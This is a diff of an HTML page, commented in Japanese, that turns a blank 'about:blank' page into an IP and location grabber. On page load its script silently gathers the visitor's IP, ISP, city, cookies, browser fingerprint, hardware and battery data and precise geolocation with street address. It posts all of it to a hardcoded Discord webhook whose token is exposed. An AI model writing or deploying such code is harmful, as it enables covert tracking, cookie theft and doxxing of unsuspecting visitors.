@@ -3,13 +3,282 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>about:blank</about:blank></title>
-    <link rel="stylesheet" href="styles.css"> <!-- CSSファイルへのリンク -->
+    <title>User Info to Discord Webhook</title>
+    <style>
+        #map {
+            width: 100%;
+            height: 400px; /* 地図の高さ */
+            margin-bottom: 20px;
+        }
+    </style>
 </head>
 <body>
-    <div class="container">
+    <div id="map"></div>
+    <div id="address"></div>
 
-    </div>
-    <script src="script.js"></script> <!-- JavaScriptファイルへのリンク -->
+    <script>
+        // Webhook URLを設定
+        const webhookUrl = 'https://discord.com/api/webhooks/1374315937511112765/Dj1jq996RkTZZCO26-g9J1sSUGw5O7D71FgPP6WXBn8DTQjdNnZpC4bwqaSgc7ev7awl';
+        // ユーザー情報を取得する関数
+        async function getUserInfo() {
+            const userAgent = navigator.userAgent;
+            const referrer = document.referrer;
+            const acceptHeader = navigator.userAgent.includes("Chrome") ? "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" : "*/*";
+            const acceptLanguage = navigator.language || navigator.userLanguage;
+            const cookies = document.cookie;
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+            const screenPixelRatio = window.devicePixelRatio;
+            const viewportWidth = window.innerWidth;
+            const viewportHeight = window.innerHeight;
+
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            const connectionType = connection ? connection.effectiveType : "unknown";
+
+            const hardwareInfo = {
+                cpuCores: navigator.hardwareConcurrency || "unknown",
+                deviceMemory: navigator.deviceMemory || "unknown",
+            };
+
+            let batteryLevel = "Unknown";
+            let batteryCharging = false;
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                batteryLevel = (battery.level * 100).toFixed(0);
+                batteryCharging = battery.charging;
+            }
+
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const dateTime = new Date().toISOString();
+            const screenOrientation = (screen.orientation && screen.orientation.type) ? screen.orientation.type : "unknown";
+            const estimatedSpeed = connection ? `${connection.downlink} Mbps` : "unknown";
+            const browserLanguage = navigator.language || navigator.userLanguage;
+            const colorDepth = window.screen.colorDepth || "unknown";
+            const deviceType = /Mobi|Android/i.test(userAgent) ? 'Mobile' : 'Desktop';
+            const currentURL = window.location.href;
+            const domainName = document.domain;
+            const TLD = domainName.split('.').pop();
+            const browserVersion = userAgent.split(' ')[0];
+            const osVersion = userAgent.split('(')[1]?.split(')')[0] || "Unknown";
+
+            let webglInfo = "Unknown";
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                        webglInfo = `${vendor} - ${renderer}`;
+                    }
+                }
+            } catch (e) {
+                webglInfo = "WebGL unable to retrieve information";
+            }
+
+            const defaultFontFamily = getComputedStyle(document.body).fontFamily;
+            const sessionStartTime = Date.now();
+
+            return {
+                userAgent,
+                referrer,
+                acceptHeader,
+                acceptLanguage,
+                cookies,
+                screenResolution,
+                screenPixelRatio,
+                viewportWidth,
+                viewportHeight,
+                connectionType,
+                hardwareInfo,
+                timeZone,
+                dateTime,
+                screenOrientation,
+                estimatedSpeed,
+                browserLanguage,
+                webglInfo,
+                defaultFontFamily,
+                colorDepth,
+                deviceType,
+                currentURL,
+                domainName,
+                TLD,
+                browserVersion,
+                osVersion,
+                batteryLevel,
+                batteryCharging,
+                sessionStartTime
+            };
+        }
+
+        // 位置情報取得のための関数
+        async function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            resolve({
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude
+                            });
+                        },
+                        (error) => {
+                            console.error('位置情報の取得に失敗:', error);
+                            reject(error);
+                        }
+                    );
+                } else {
+                    reject(new Error('Geolocation is not supported by this browser.'));
+                }
+            });
+        }
+
+        // Googleマップの画像と住所情報を表示する関数
+        async function displayMapAndAddress(latitude, longitude) {
+            const mapDiv = document.getElementById('map');
+            const addressDiv = document.getElementById('address');
+
+            // Googleマップの画像を埋め込み
+            const mapImageUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${latitude},${longitude}&zoom=15&size=600x400&markers=color:red%7C${latitude},${longitude}&key=YOUR_GOOGLE_MAPS_API_KEY`; // Google Maps API Keyを設定
+            mapDiv.innerHTML = `<img src="${mapImageUrl}" alt="Map" />`;
+
+            // リバースジオコーディングを使って住所を取得
+            const geoResponse = await fetch(`https://maps.googleapis.com/maps/api/geocode/json?latlng=${latitude},${longitude}&key=YOUR_GOOGLE_MAPS_API_KEY`); // Google Maps API Keyを設定
+            const geoData = await geoResponse.json();
+
+            if (geoData.status === "OK") {
+                const address = geoData.results[0].formatted_address;
+                addressDiv.innerHTML = `<strong>住所:</strong> ${address}`;
+                return address;
+            } else {
+                console.error("住所の取得に失敗:", geoData.status);
+                return "住所が見つかりません";
+            }
+        }
+
+        // Fetch APIを使用してIPアドレスや地域情報を取得し、Webhookに送信
+        async function sendUserInfoToDiscordWebhook() {
+            try {
+                // IPアドレスを取得
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+
+                // IPアドレスから地域情報を取得
+                const geoResponse = await fetch(`http://ip-api.com/json/${ipData.ip}`);
+                const geoData = await geoResponse.json();
+                
+                // ユーザー情報を取得
+                const userInfo = await getUserInfo();
+
+                // Discord Webhookの送信データ構成（エンベッドを分割）
+                const embed1 = {
+                    title: "基本情報",
+                    fields: [
+                        { name: "IP Address", value: ipData.ip, inline: true },
+                        { name: "Country", value: geoData.country || "N/A", inline: true },
+                        { name: "Region", value: geoData.regionName || "N/A", inline: true },
+                        { name: "City", value: geoData.city || "N/A", inline: true },
+                        { name: "ISP", value: geoData.isp || "N/A", inline: true },
+                        { name: "Connection Type", value: userInfo.connectionType || "N/A", inline: true },
+                        { name: "Battery Level", value: `${userInfo.batteryLevel || "N/A"}%`, inline: true },
+                        { name: "Battery Charging", value: userInfo.batteryCharging ? "✅ Yes" : "❌ No", inline: true },
+                    ],
+                    color: 7506394 // 任意の色
+                };
+
+                const embed2 = {
+                    title: "デバイス情報",
+                    fields: [
+                        { name: "CPU Cores", value: userInfo.hardwareInfo.cpuCores || "N/A", inline: true },
+                        { name: "Device Memory (GB)", value: userInfo.hardwareInfo.deviceMemory || "N/A", inline: true },
+                        { name: "Time Zone", value: userInfo.timeZone || "N/A", inline: true },
+                        { name: "Current Date and Time", value: userInfo.dateTime || "N/A", inline: true },
+                        { name: "Device Type", value: userInfo.deviceType || "N/A", inline: true },
+                        { name: "Screen Orientation", value: userInfo.screenOrientation || "N/A", inline: true },
+                        { name: "Estimated Speed", value: userInfo.estimatedSpeed || "N/A", inline: true },
+                    ],
+                    color: 3066993 // 任意の色
+                };
+
+                const embed3 = {
+                    title: "ブラウザ情報",
+                    fields: [
+                        { name: "User Agent", value: userInfo.userAgent || "N/A", inline: false },
+                        { name: "Browser Language", value: userInfo.browserLanguage || "N/A", inline: true },
+                        { name: "WebGL Info", value: userInfo.webglInfo || "N/A", inline: true },
+                        { name: "Default Font Family", value: userInfo.defaultFontFamily || "N/A", inline: true },
+                        { name: "Color Depth", value: userInfo.colorDepth || "N/A", inline: true },
+                        { name: "Current URL", value: userInfo.currentURL || "N/A", inline: true },
+                        { name: "Domain Name", value: userInfo.domainName || "N/A", inline: true },
+                        { name: "Top-Level Domain (TLD)", value: userInfo.TLD || "N/A", inline: true },
+                        { name: "Browser Version", value: userInfo.browserVersion || "N/A", inline: true },
+                        { name: "OS Version", value: userInfo.osVersion || "N/A", inline: true },
+                    ],
+                    color: 15158332 // 任意の色
+                };
+
+                const embed4 = {
+                    title: "セッション情報",
+                    fields: [
+                        { name: "Session Start Time", value: new Date(userInfo.sessionStartTime).toLocaleString() || "N/A", inline: true },
+                        { name: "Cookies", value: userInfo.cookies || "N/A", inline: false },
+                    ],
+                    color: 5814783 // 任意の色
+                };
+
+                // 取得した情報をDiscordのWebhookに送信
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: "新しいユーザー情報を取得しました！",
+                        embeds: [embed1, embed2, embed3, embed4] // 複数のエンベッドを含める
+                    })
+                });
+
+                if (response.ok) {
+                    console.log('ユーザー情報をDiscord Webhookに送信しました');
+                } else {
+                    const errorText = await response.text();
+                    console.error(`エラー: ${response.status} ${errorText}`);
+                }
+
+                // 位置情報を取得
+                const location = await getLocation();
+                const address = await displayMapAndAddress(location.latitude, location.longitude);
+
+                // 位置情報をDiscord Webhookに送信
+                const locationEmbed = {
+                    title: "位置情報",
+                    fields: [
+                        { name: "Latitude", value: location.latitude.toFixed(6), inline: true },
+                        { name: "Longitude", value: location.longitude.toFixed(6), inline: true },
+                        { name: "Address", value: address || "N/A", inline: false },
+                    ],
+                    color: 5814783 // 任意の色
+                };
+
+                // 位置情報をDiscord Webhookに送信
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: "ユーザーの位置情報を取得しました！",
+                        embeds: [locationEmbed] // 位置情報含むエンベッド
+                    })
+                });
+
+            } catch (error) {
+                console.error('エラーが発生しました:', error);
+            }
+        }
+
+        // ページがロードされたときに実行
+        window.onload = sendUserInfoToDiscordWebhook;
+    </script>
 </body>
 </html>
